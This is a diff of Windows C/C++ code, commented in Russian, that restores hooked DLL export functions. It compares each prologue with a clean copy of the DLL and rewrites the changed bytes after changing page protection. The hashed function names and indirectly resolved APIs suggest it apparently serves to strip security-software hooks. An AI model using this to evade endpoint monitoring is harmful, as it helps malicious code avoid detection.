@@ -44,18 +44,21 @@ bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
 
 void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNameHashes)
 {
-	const static DWORD RestoreSize = 15;
+	const static DWORD RestoreSize = 10;
 
+	// Получаем заголовок dll
 	PIMAGE_NT_HEADERS OriginalHeaders = Unhook_GetNTHeaders(OriginalImage);
 	PIMAGE_NT_HEADERS CurrentHeaders  = Unhook_GetNTHeaders(CurrentImage);
 
+	// Получаем директорию  информацией о таблице экспорта
 	PIMAGE_DATA_DIRECTORY OriginalDirectory = &OriginalHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 	PIMAGE_DATA_DIRECTORY CurrentDirectory = &CurrentHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
 
+	// Получаем таблицу экпорта
 	PIMAGE_EXPORT_DIRECTORY OriginalExports = (PIMAGE_EXPORT_DIRECTORY)(OriginalImage + OriginalDirectory->VirtualAddress);
 	PIMAGE_EXPORT_DIRECTORY CurrentExports  = (PIMAGE_EXPORT_DIRECTORY)(CurrentImage + CurrentDirectory->VirtualAddress);
 
-
+    // Перебираем все функции и определяем необходимоть вотановления
 	PDWORD NameRef = (PDWORD)(OriginalImage + OriginalExports->AddressOfNames);
 	PWORD  Ordinal = (PWORD)(OriginalImage + OriginalExports->AddressOfNameOrdinals);
 
@@ -64,12 +67,14 @@ void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNam
 		PCHAR Name = (PCHAR)(OriginalImage + *NameRef);
 		if (!CanRestoreFunc(Name, ProcNameHashes)) continue;
 
+		// Получаем указатели на функции в обоих dll
         WORD idx = *Ordinal;
 		LPBYTE OriginalFunc = (OriginalImage + *(PDWORD)(OriginalImage + OriginalExports->AddressOfFunctions + (idx*4)));
 		LPBYTE CurrentFunc = (CurrentImage + *(PDWORD)(CurrentImage + CurrentExports->AddressOfFunctions + (idx*4)));
 
 		if (m_memcmp(OriginalFunc, CurrentFunc, RestoreSize) != 0)
 		{
+			// Функции отличаются, востанавливаем код.
 			DWORD OldProtect = 0;
 			if ((BOOL)pVirtualProtect((LPVOID)CurrentFunc, RestoreSize, PAGE_EXECUTE_READWRITE, &OldProtect ) )
 			{
@@ -79,69 +84,6 @@ void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNam
         }
 	}
 }
-
-
-/*
-void WINAPI UnhookFunc( LPVOID hMap, LPVOID CurrentImage, PDWORD ProcNameHashes)
-{
-	if (!hMap || !CurrentImage || !ProcNameHashes)
-		return;
-
-	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)hMap + ( (PIMAGE_DOS_HEADER)hMap)->e_lfanew + sizeof( DWORD ) + sizeof( IMAGE_FILE_HEADER ) );
-	PIMAGE_EXPORT_DIRECTORY ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA( hMap, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );	
-	ULONG *functionEntryPoints  = (ULONG*)( (ULONG)hMap + ped->AddressOfFunctions );
-
-
-	const static BYTE RestoreSize = 10;
-
-
-	DWORD *pdwNamePtr  = (DWORD*)RVATOVA(hMap, ped->AddressOfNames);
-	WORD *pwOrdinalPtr = (WORD*)RVATOVA(hMap, ped->AddressOfNameOrdinals);
-
-
-	BYTE entryPointBytes[RestoreSize];
-	BYTE originalBytes[RestoreSize];
-
-
-
-	for (int i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
-	{
-		PCHAR Name = (char*)RVATOVA( hMap, *pdwNamePtr );
-		if (CanRestoreFunc(Name, ProcNameHashes))
-		{
-			// Восстанавливаем функцию
-			ULONG entryVA = (DWORD)CurrentImage + functionEntryPoints[*pwOrdinalPtr];
-			ULONG entryMA =	( (ULONG)hMap  + functionEntryPoints[*pwOrdinalPtr] );
-
-			m_memcpy( originalBytes, (LPVOID)entryMA, RestoreSize);
-			m_memcpy( entryPointBytes, (LPVOID)entryVA, RestoreSize);
-
-
-			if ( m_memcmp( entryPointBytes, originalBytes, RestoreSize) )
-			{
-				DWORD dwOldProtect;
-
-				if ( (BOOL)pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, RestoreSize, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
-				{
-
-					// Сохраняем дампы для отладки
-//						string FN;
-//						FN.Format("c:\\Debug\\Unhook\\%s_Current.dat", Name);
-//						File::WriteBufferA(FN.t_str(), (LPVOID)entryVA, 30);
-//
-//						FN.Format("c:\\Debug\\Unhook\\%s_Original.dat", Name);
-//						File::WriteBufferA(FN.t_str(), (LPVOID)entryMA, 30);
-
-					//pOutputDebugStringA(Name);
-
-					m_memcpy( (LPVOID)entryVA, (LPCVOID)originalBytes, 10 );
-					pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, dwOldProtect, &dwOldProtect );
-				}
-			}
-		}
-	}
-}
-*/
 //---------------------------------------------------------------------------
 
 void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
@@ -158,10 +100,19 @@ void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
 
 	// Загружаем dlld промежуточный буфер
 	LPVOID OriginalDLL = MemAlloc(Headers->OptionalHeader.SizeOfImage);
-					
+
 
 	if (OriginalDLL)
 	{
+		//***************************************************
+		//  Для корректного снятия хуков нам необходимо
+		//  привести образ оригинальной dll. с этой целью
+		//  мы загружаем ораз в память, копируем екции и
+		//  правим релоки
+		//  Релоки правим таким образом чтобы получились
+		//  адреса как в целевой библиотеке
+		//***************************************************
+
 		// Копируем заголовки
 		DWORD CopySize = ((PIMAGE_DOS_HEADER)OriginalImage)->e_lfanew + Headers->OptionalHeader.SizeOfHeaders;
 		m_memcpy(OriginalDLL, OriginalImage, CopySize);
